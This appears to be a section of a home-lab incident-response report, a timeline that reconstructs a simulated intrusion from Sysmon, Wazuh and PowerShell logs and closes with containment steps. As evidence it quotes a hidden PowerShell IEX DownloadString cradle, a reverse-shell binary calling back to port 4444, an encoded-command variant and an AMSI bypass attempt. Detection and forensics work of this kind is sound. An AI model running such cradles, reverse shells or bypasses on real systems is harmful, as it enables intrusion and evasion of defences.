# 06 — Timeline (actual, from evidence)

Note: timestamps span multiple test runs (Oct 26–28); correlation was by process/IP. Times below are per-artifact (UTC noted where available).

| # | Time | Event | Source | Evidence |
|---|---|---|---|---|
| 1 | 2026-10-26 17:33:27 UTC | Reverse-shell binary `free.exe` (bryll\Downloads) connects to 192.168.100.106:4444 — Sysmon Event ID 3 (T1571) | winhome01 → Wazuh | 09 |
| 2 | 2026-10-27 16:09:43 UTC | `powershell.exe -nop -w hidden -c IEX...DownloadString(payload.ps1)` spawned (32-bit, SYSTEM, parent cmd.exe) — Sysmon Event ID 1 (T1059.001) | winhome01 → Wazuh | 07 |
| 3 | 2026-10-28 07:50:56 UTC | HTTP server on Kali logs `192.168.100.108 GET /payload.ps1 200` — payload downloaded | Kali | 03 |
| 4 | ~same | Payload executes: `[+] beacon check-in OK` + whoami/hostname (IEX cradle) | winhome01 | 02 |
| 5 | ~same | Encoded command (`-enc` base64 of IEX cradle) executes — T1027 | winhome01 | 04 |
| 6 | 2026-10-28 12:05:44 UTC | PowerShell 4104 Script Block logged (decoded blocks) — defeats `-enc` | winhome01 → Wazuh | 08 |
| 7 | post-attack | AMSI bypass attempted (amsiInitFailed reflection); download failed (server stopped) — technique captured | winhome01 | 05 |
| 8 | containment | psexec session killed, `free.exe` deleted, adminlab rotated, .106 blocked | — | — |

## Key correlation chain

`psexec (SYSTEM) → powershell.exe -nop -w hidden IEX DownloadString (Sysmon 1) → HTTP GET payload.ps1 200 (server log) → 4104 decoded script blocks → free.exe → .106:4444 (Sysmon 3)`. The full attack lifecycle is reconstructable from telemetry.
